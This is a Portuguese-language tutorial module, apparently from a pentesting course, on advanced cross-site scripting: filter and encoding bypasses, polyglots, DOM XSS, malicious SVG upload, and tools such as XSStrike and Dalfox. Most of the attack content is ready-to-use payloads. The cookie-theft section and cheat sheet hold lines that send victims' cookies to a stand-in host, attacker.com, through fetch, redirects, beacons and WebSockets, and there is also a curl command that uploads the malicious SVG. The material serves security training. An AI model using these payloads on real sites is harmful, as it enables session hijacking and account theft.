# ⚡ 04. XSS Avançado — Bypass de Filtros, Polyglots e Automação

> XSS básico é fácil. O desafio é bypassar filtros, CSP e WAF — e é aqui que a maioria dos hackers trava.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 60min | ⭐⭐⭐ Avançado | `XSStrike, Dalfox, Burp Repeater` |

</div>

---

## 🎓 Por que isso importa?

XSS avançado vai além de `<script>alert(1)</script>`. Envolve **bypass de filtros**, **polyglots** (payloads que funcionam em qualquer contexto), **DOM XSS** e **XSS via upload de SVG**.

**Analogia:** XSS básico é como destrancar uma porta. XSS avançado é bypassar fechadura digital, câmera e alarme — tudo ao mesmo tempo.

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| XSS básico (Reflected, Stored, DOM) | Sim | Módulo 00 |
| HTML/JavaScript básico | Sim | — |
| Burp Suite | Sim | Arquivo 01 |

---

## 🎯 Quando usar XSS Avançado

- Quando filtros bloqueiam payloads básicos
- Para bypass de **CSP** (Content Security Policy)
- Para **DOM XSS** (payloads no client-side)
- Para XSS via **SVG upload**
- Para **cookie theft** e session hijacking

---

## 📝 Bypass de Filtros

### Bypass de Tag Script

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- Tag aninhada -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Uppercase/Lowercase mix -->
<scriPT>alert(1)</scriPT>

<!-- Sem < e > -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
```

### Bypass de Event Handlers

```html
<!-- Sem onerror, onload -->
<svg/onload=alert(1)>
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>

<!-- Via href -->
<a href="javascript:alert(1)">Click</a>
<a href="java&#x73;cript:alert(1)">Click</a>
<a href="data:text/html,<script>alert(1)</script>">Click</a>

<!-- Via action -->
<form action="javascript:alert(1)">
  <button>Click</button>
</form>
```

### Bypass de Encoding

```html
<!-- HTML entities -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E
%3Cscr%6ipt%3Ealert(1)%3C/scr%6ipt%3E

<!-- Double URL encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e
<script>\u0061lert(1)</script>

<!-- Null byte -->
<scri%00pt>alert(1)</scri%00pt>

<!-- Backslash -->
<scr\ipt>alert(1)</scr\ipt>
```

### Bypass de ASP/JSP

```html
<!-- ASP.NET -->
<%alert(1)%>
<script language="VBScript">alert(1)</script>

<!-- JSP -->
<%= Runtime.getRuntime().exec("id") %>
```

---

## 📝 Polyglot Payloads

Polyglots funcionam em **múltiplos contextos** ao mesmo tempo.

```html
# Polyglot XSS básico
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//

# Polyglot que funciona em HTML, JS e URL
'">><marquee><img src=x onerror=confirm(1)></marquee>">

# Polyglot para attribute injection
" onfocus=alert(1) autofocus="

# Polyglot SVG + XSS
<svg/onload=alert(1)//>
<svg onload=alert(1)>

# Polyglot para template injection
{{constructor.constructor('alert(1)')()}}
${alert(1)}
<%= alert(1) %>
```

---

## 🛠️ Ferramentas

### XSStrike

```bash
# Instalar
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt

# Scan básico
python3 xsstrike.py -u "http://target.com/search?q=test"

# Scan com parâmetros customizados
python3 xsstrike.py -u "http://target.com/search" --data "q=test"

# Usar com cookies
python3 xsstrike.py -u "http://target.com/search?q=test" --cookie "session=abc123"
```

### Dalfox

```bash
# Instalar
go install github.com/hahwul/dalfox/v2@latest

# Scan básico
dalfox url "http://target.com/search?q=test"

# Scan com parâmetros
dalfox url "http://target.com/search?q=test" --method POST --data "q=test"

# Output JSON
dalfox url "http://target.com/search?q=test" --format json

# Pipe mode
echo "http://target.com/search?q=test" | dalfox pipe
```

---

## 📝 DOM XSS

### Fontes Perigosas (Sources)

```javascript
document.URL
document.documentURI
document.referrer
location.href
location.search
location.hash
window.name
document.cookie
postMessage data
```

### Sumidouros Perigosos (Sinks)

```javascript
eval()
setTimeout()
setInterval()
document.write()
document.writeln()
innerHTML
outerHTML
jQuery.html()
element.insertAdjacentHTML()
element.src
element.href
element.action
```

### Como Explorar

```bash
# 1. Identificar source no JavaScript da página
# 2. Rastrear fluxo até um sink
# 3. Criar payload que explora o fluxo

# Exemplo de código vulnerável:
# var name = document.URL.substring(document.URL.indexOf("name=") + 5);
# document.getElementById("output").innerHTML = "Olá, " + name;

# Payload:
http://target.com/page?name=<img src=x onerror=alert(1)>
```

### Ferramentas para DOM XSS

```bash
# LinkFinder (encontrar endpoints em JS)
python3 linkfinder.py -i http://target.com -o cli

# JSParser (analisar JavaScript)
python3 jsparser.py http://target.com/app.js
```

---

## 📝 XSS via SVG Upload

```bash
# Criar SVG com XSS
cat > xss.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <text x="10" y="20">XSS via SVG</text>
</svg>
EOF

# Upload
curl -X POST http://target.com/upload \
  -F "file=@xss.svg;type=image/svg+xml"

# Acessar SVG → XSS dispara
```

---

## 📝 Cookie Theft

```bash
# Extrair cookie via XSS
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">

# Extrair via redirect
<script>location='http://attacker.com/steal?c='+document.cookie</script>

# Extrair via beacon
<script>navigator.sendBeacon('http://attacker.com/steal',document.cookie)</script>

# Extrair via WebSocket
<script>
var ws=new WebSocket('ws://attacker.com');
ws.onopen=function(){ws.send(document.cookie)};
</script>
```

---

## 📋 Cheat Sheet Rápido

### Payloads Básicos

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

### Payloads de Cookie Theft

```html
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

### Polyglots

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
'">><marquee><img src=x onerror=confirm(1)></marquee>
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) | Reflected básico | 10min |
| 2 | PortSwigger | [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) | Stored XSS | 15min |
| 3 | PortSwigger | [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) | DOM-based | 15min |
| 4 | PortSwigger | [XSS with event handlers](https://portswigger.net/web-security/cross-site-scripting/events) | Event handlers | 15min |
| 5 | PortSwigger | [XSS via HTML-enclosed tags](https://portswigger.net/web-security/cross-site-scripting/contexts) | Contextos diferentes | 20min |

---

## 📚 Referências

- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSStrike](https://github.com/s0md3v/XSStrike)
- [Dalfox](https://github.com/hahwul/dalfox)
- [HackTricks — XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [OWASP — XSS Filter Bypass](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Bypassar filtros de XSS (tags, eventos, encoding)
- [ ] Usar polyglots que funcionam em múltiplos contextos
- [ ] Detectar e explorar DOM XSS
- [ ] Fazer XSS via SVG upload
- [ ] Roubar cookies via XSS
- [ ] Usar XSStrike e Dalfox para automação
- [ ] Completar os labs PortSwigger de XSS
